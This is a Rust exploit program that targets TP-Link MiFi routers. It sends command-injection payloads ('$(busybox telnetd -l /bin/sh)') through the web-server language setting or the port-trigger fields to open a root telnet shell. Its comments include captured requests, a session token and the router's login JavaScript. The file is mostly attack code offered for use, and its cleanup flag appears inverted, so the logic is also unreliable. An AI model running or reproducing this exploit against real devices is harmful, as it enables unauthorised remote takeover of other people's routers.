use std::str::FromStr;
use std::{collections::HashMap, ops::Add};
use clap::Parser;
use reqwest;
use reqwest::header::*;
use reqwest::header::{HeaderName,HeaderValue};
use serde::{Deserialize, Serialize};
use serde_json::Result;


#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Filename
    #[arg(required = true)]
    token: String,
	
	#[arg(long, default_value_t = 1)]
	hw_version: u8

}

/*
	curl 'http://tplinkmifi.net/cgi-bin/qcmap_auth' 
	-X POST 
	-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0' 
	-H 'Accept: application/json, text/javascript, *SLASH*; q=0.01' 
	-H 'Accept-Language: de,en-US;q=0.7,en;q=0.3' 
	-H 'Accept-Encoding: gzip, deflate' 
	-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' 
	-H 'X-Requested-With: XMLHttpRequest' 
	-H 'Origin: http://tplinkmifi.net' 
	-H 'Connection: keep-alive' 
	-H 'Referer: http://tplinkmifi.net/login.html' 
	-H 'Pragma: no-cache' 
	-H 'Cache-Control: no-cache' 
	--data-raw '{"module":"authenticator","action":1,"digest":"0d8777ad7c35bbb0aa9a795e70e408f6"}'*/

#[derive(Serialize, Deserialize)]
struct Auth {
	module: String,
	action: u8,
	digest: String
}

/*
{"token":"Ваше значение token","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}
*/
#[derive(Serialize, Deserialize,Debug)]
struct PayloadV1 {
	token: String,
	module: String,
	action: u8,
	language: String
}

#[derive(Serialize, Deserialize,Debug)]
#[serde(rename_all = "camelCase")]
struct PayloadV5 {
	token: String,
	module: String,
	action: u8,
	entry_id: u8,
	enable_state: u8,
	application_name: String,
	trigger_port: String,
	trigger_protocol: String,
	open_port: String,
	open_protocol: String,
}

#[derive(Serialize, Deserialize,Debug)]
#[serde(rename_all = "camelCase")]
struct PayloadCleanupV5 {
	token: String,
	module: String,
	action: u8,
	entry_id_set: Vec<u8>
}

#[derive(Serialize,Debug)]
#[serde(untagged)]
enum Payload {
	V1(PayloadV1),
	V5(PayloadV5),
	CleanupV5(PayloadCleanupV5)
}

fn get_payload(version: u8, token: &String, cleanup: bool) -> Payload {

	let attack_string: String;

	if version < 5 {

		attack_string = if cleanup {
			String::from("$(busybox telnetd -l /bin/sh)")
		} else {
			String::from("en")
		};

		Payload::V1(PayloadV1{
			token: token.into(),
			module: "webServer".to_string(),
			action: 1,
			language: attack_string
		})
	} else if cleanup {

		Payload::CleanupV5(PayloadCleanupV5{
			token: token.into(),
			module: String::from("portTrigger"),
			action: 2,
			entry_id_set: vec![1]
		})
	} else {

		/*
			"token": @options[:token],
            "module": "portTrigger",
            "action": 1,
            "entryId": 1,
            "enableState": 1,
            "applicationName": "telnetd",
            "triggerPort": "$(busybox telnetd -l /bin/sh)",
            "triggerProtocol": "TCP",
            "openPort": "1337-2137",
            "openProtocol": "TCP"
		 */
		

		attack_string = if cleanup {
			String::from("$(busybox telnetd -l /bin/sh)")
		} else {
			String::from("en")
		};

		 Payload::V5(PayloadV5 {
			token: token.into(),
			module: String::from("portTrigger"),
			action: 2,
			entry_id: 1,
			enable_state: 1,
			application_name: String::from("telnetd"),
			trigger_port: attack_string,
			trigger_protocol: String::from("TCP"),
			open_port: String::from("1337-2137"),
			open_protocol: String::from("TCP"),
		})
		
	}
}


#[tokio::main]
async fn main()  {

	let args = Args::parse();
	let token = args.token;
	let version = args.hw_version;

	// TODO implement AUTH

	/*
	
	var AUTH_MODULE = 'authenticator', WEB_CGI = 'cgi-bin/qcmap_web_cgi', AUTH_CGI = 'cgi-bin/qcmap_auth', authAction = {
		LOAD: 0,
		LOGIN: 1,
		CHECK_ATTEMPT: 2,
		CLOSE: 3,
		UPDATE: 4
	}, unsetFacAction = 3, ajaxTimeout = 10000, AUTH_RES = {
		success: 0,
		hasLogin: 1,
		pwdWrong: 2,
		ipLocked: 3,
		otherLogin: 4,
		unknownResult: 5
	}, AuthModel = {
		g_token: '',
		login: function (a, b, c) {
			if (!a || !b)
				return null;
			var d = callJSON(AUTH_MODULE, authAction.LOAD, null, null, null, ajaxTimeout, !1);
			if (null === d)
				return console.log('Auth Request Error'), void 0;
			var e = CryptoJS.MD5([
					a,
					b,
					d.nonce
				].join(':')).toString(), f = callJSON(AUTH_MODULE, authAction.LOGIN, { digest: e }, null, null, ajaxTimeout, !1);
			switch (f.result) {
			case 0:
				AuthModel.setAuthToken(f.token), c(AUTH_RES.success);
				break;
			case 1:
				c(AUTH_RES.pwdWrong);
				break;
			default:
				c(AUTH_RES.unknownResult);
			}
		},
		setAuthToken: function (a) {
			AuthModel.isCookieEnable() ? $.cookie('tpweb_token', a) : AuthModel.g_token = a;
		},
		removeAuthToken: function () {
			AuthModel.isCookieEnable() ? $.removeCookie('tpweb_token') : AuthModel.g_token = '';
		},
		logout: function (a) {
			var b = callJSON(AUTH_MODULE, authAction.CLOSE, null, null, null, ajaxTimeout, !1);
			AuthModel.removeAuthToken(), a(b);
		},
		getToken: function () {
			var a = '';
			if (AuthModel.isCookieEnable()) {
				var b = $.cookie('tpweb_token');
				b ? a = b : AuthModel.promptNotAuth();
			} else
				AuthModel.g_token ? a = g_token : AuthModel.promptNotAuth();
			return a;
		},
	 */

	/*
	curl 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' 
		-X POST 
		-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0' 
		-H 'Accept: application/json, text/javascript, *SLASH*; q=0.01' 
		-H 'Accept-Language: de,en-US;q=0.7,en;q=0.3' 
		-H 'Accept-Encoding: gzip, deflate' 
		-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' 
		-H 'X-Requested-With: XMLHttpRequest' 
		-H 'Origin: http://192.168.0.1' 
		-H 'Connection: keep-alive' 
		-H 'Referer: http://192.168.0.1/settings.html' 
		-H 'Cookie: tpweb_token=xZorYxwA357MLtbd' 
		-H 'Pragma: no-cache' 
		-H 'Cache-Control: no-cache' 
		--data-raw '{"token":"xZorYxwA357MLtbd","module":"storageShare","action":1,"mode":0,"login":0,"rwPermission":1}'
	 */

	let local_token = String::from(&token);

	let mut cookie = "tpweb_token=".to_string();
	let cookie = cookie.add(&local_token);

	let mut headers = HeaderMap::new();
	headers.insert(
		COOKIE,
		HeaderValue::from_str(&cookie).unwrap()
	);

	/*{"token":"Ваше значение token","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}*/

	let payload = get_payload(version, &local_token, false);

	let payload_cleanup = get_payload(version, &local_token, true);

	/*let payload = PayloadV1 {
		token: String::from(&token),
		module: "webServer".to_string(),
		action: 1,
		language: "$(busybox telnetd -l /bin/sh)".to_string()
	};

	let payload_cleanup = PayloadV1 {
		token: String::from(&token),
		module: "webServer".to_string(),
		action: 1,
		language: "en".to_string()
	};*/

	let payload_str = serde_json::to_string(&payload).unwrap();

	println!("{token:#?}");
	println!("{payload:#?}");
	println!("{payload_str:#?}");
	println!("{headers:#?}");

	let client = reqwest::Client::new();

	let payload_headers = headers.clone();
	
	let payload_restore_language_headers = headers.clone();
	let payload_restore_language_str = serde_json::to_string(&payload_cleanup).unwrap();

	let resp = client.post("http://192.168.0.1/cgi-bin/qcmap_web_cgi")
		.body(payload_str)
		.headers(payload_headers)
		.send()
		.await;

    println!("{resp:#?}");

	let resp_language = client.post("http://192.168.0.1/cgi-bin/qcmap_web_cgi")
		.body(payload_restore_language_str)
		.headers(payload_restore_language_headers)
		.send()
		.await;

	println!("{resp_language:#?}");

}

